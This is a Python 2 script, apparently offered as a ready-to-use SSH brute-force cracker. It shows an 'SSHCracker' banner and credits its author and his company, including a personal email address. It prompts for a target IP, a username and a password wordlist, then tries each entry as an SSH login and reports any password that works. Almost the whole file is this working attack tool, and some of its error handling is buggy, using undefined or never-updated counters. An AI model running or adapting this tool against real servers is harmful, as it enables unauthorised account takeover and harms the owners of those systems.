###Author: Omar Rajab
###Company: BlackHatch


import pxssh
import os
import time

os.system("clear")
print("""\033[1;31m                                                                                                                                   
                                                                                                                                                                                                                  
                                                                                                                                                                                                                   
   SSSSSSSSSSSSSSS    SSSSSSSSSSSSSSS HHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCRRRRRRRRRRRRRRRRR                  AAA                  CCCCCCCCCCCCCKKKKKKKKK    KKKKKKKEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   
 SS:::::::::::::::S SS:::::::::::::::SH:::::::H     H:::::::H   CCC::::::::::::CR::::::::::::::::R                A:::A              CCC::::::::::::CK:::::::K    K:::::KE::::::::::::::::::::ER::::::::::::::::R  
S:::::SSSSSS::::::SS:::::SSSSSS::::::SH:::::::H     H:::::::H CC:::::::::::::::CR::::::RRRRRR:::::R              A:::::A           CC:::::::::::::::CK:::::::K    K:::::KE::::::::::::::::::::ER::::::RRRRRR:::::R 
S:::::S     SSSSSSSS:::::S     SSSSSSSHH::::::H     H::::::HHC:::::CCCCCCCC::::CRR:::::R     R:::::R            A:::::::A         C:::::CCCCCCCC::::CK:::::::K   K::::::KEE::::::EEEEEEEEE::::ERR:::::R     R:::::R
S:::::S            S:::::S              H:::::H     H:::::H C:::::C       CCCCCC  R::::R     R:::::R           A:::::::::A       C:::::C       CCCCCCKK::::::K  K:::::KKK  E:::::E       EEEEEE  R::::R     R:::::R
S:::::S            S:::::S              H:::::H     H:::::HC:::::C                R::::R     R:::::R          A:::::A:::::A     C:::::C                K:::::K K:::::K     E:::::E               R::::R     R:::::R
 S::::SSSS          S::::SSSS           H::::::HHHHH::::::HC:::::C                R::::RRRRRR:::::R          A:::::A A:::::A    C:::::C                K::::::K:::::K      E::::::EEEEEEEEEE     R::::RRRRRR:::::R 
  SS::::::SSSSS      SS::::::SSSSS      H:::::::::::::::::HC:::::C                R:::::::::::::RR          A:::::A   A:::::A   C:::::C                K:::::::::::K       E:::::::::::::::E     R:::::::::::::RR  
    SSS::::::::SS      SSS::::::::SS    H:::::::::::::::::HC:::::C                R::::RRRRRR:::::R        A:::::A     A:::::A  C:::::C                K:::::::::::K       E:::::::::::::::E     R::::RRRRRR:::::R 
       SSSSSS::::S        SSSSSS::::S   H::::::HHHHH::::::HC:::::C                R::::R     R:::::R      A:::::AAAAAAAAA:::::A C:::::C                K::::::K:::::K      E::::::EEEEEEEEEE     R::::R     R:::::R
            S:::::S            S:::::S  H:::::H     H:::::HC:::::C                R::::R     R:::::R     A:::::::::::::::::::::AC:::::C                K:::::K K:::::K     E:::::E               R::::R     R:::::R
            S:::::S            S:::::S  H:::::H     H:::::H C:::::C       CCCCCC  R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::AC:::::C       CCCCCCKK::::::K  K:::::KKK  E:::::E       EEEEEE  R::::R     R:::::R
SSSSSSS     S:::::SSSSSSSS     S:::::SHH::::::H     H::::::HHC:::::CCCCCCCC::::CRR:::::R     R:::::R   A:::::A             A:::::AC:::::CCCCCCCC::::CK:::::::K   K::::::KEE::::::EEEEEEEE:::::ERR:::::R     R:::::R
S::::::SSSSSS:::::SS::::::SSSSSS:::::SH:::::::H     H:::::::H CC:::::::::::::::CR::::::R     R:::::R  A:::::A               A:::::ACC:::::::::::::::CK:::::::K    K:::::KE::::::::::::::::::::ER::::::R     R:::::R
S:::::::::::::::SS S:::::::::::::::SS H:::::::H     H:::::::H   CCC::::::::::::CR::::::R     R:::::R A:::::A                 A:::::A CCC::::::::::::CK:::::::K    K:::::KE::::::::::::::::::::ER::::::R     R:::::R
 SSSSSSSSSSSSSSS    SSSSSSSSSSSSSSS   HHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCRRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAA   CCCCCCCCCCCCCKKKKKKKKK    KKKKKKKEEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                      
                                                                                                                                """)
print("\033[1;33mA Simple SSH Bruteforce Tool")
print("\033[1;33mAuthor: Omar Rajab Security Researcher")
print("\033[1;33mEmail:omarrajab400@gmail.com")
print("\033[1;33mCompany: BlackHatch")
print("\033[1;33mVersion: 1.0")
print("\033[1;33mLicensed by: MIT")





host = raw_input("Enter IP Address:")
user = raw_input("Enter Username:")
dict1 = raw_input("Enter Dictionary File Location:")
print("\033[1;31mNOTE: PRESS CTRL+C WHEN YOU SEE PASSWORD FOUND")


def connect(host, user, dict1):
    errors=0
    try:
        s = pxssh.pxssh()
        s.login(host, user, dict1)
        print('\033[1;32mPassword Found: ' + dict1+"\033[1;31m")
        return s
    except Exception as e:
        if errors > 5:
            print
            "!!! Too Many Socket Timeouts"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            return connect(host, user, dict1)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, dict1)
        return None


if host and user and dict1:
    with open(dict1, 'r') as infile:
        for line in infile:
            password = line.strip('\r\n')
            print("Testing: " + str(password))
            connect(host, user, password)
